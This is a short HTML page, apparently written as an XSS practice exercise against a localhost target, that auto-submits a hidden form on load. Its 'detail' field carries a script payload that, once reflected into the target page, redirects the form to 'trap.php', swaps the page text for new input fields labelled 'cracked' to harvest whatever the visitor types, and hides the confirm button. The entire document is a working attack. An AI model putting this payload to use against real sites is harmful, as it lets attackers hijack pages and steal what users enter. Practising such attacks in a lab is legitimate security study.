<!DOCTYPE>
<html>
	<head>
		<title>XSS練習用</title>
	</head>
	<body>
		<form action="http://localhost/Hacking/toppage_confirm.php" method="POST" id="form1">
			<input name="name" type="hidden" value="">
			<input name="email" type="hidden" value="">
			<input name="detail" type="hidden" value="<script>window.onload = function(){var elem1 = document.getElementsByTagName('form'); elem1[0].setAttribute('action','trap.php') ;var elem2 = document.getElementById('main').getElementsByTagName('p'); elem2[0].innerHTML='以下の項目を入力してください。'; elem2[1].innerHTML='<input type=text name=cracked1>'; elem2[2].innerHTML='<input type=mail name=cracked2>'; elem2[3].innerHTML='<textarea name=cracked3 wrap=hard style=height:150px;width:420px;border-radius:3px;resize:none;></textarea>'; var elem3 = document.getElementsByClassName('confirm_button'); elem3[0].style.display='none'; }</script>">
		</form>
		<script type="text/javascript">
			window.onload = function(){
				document.forms["form1"].submit();
			}
		</script>
	</body>
</html>
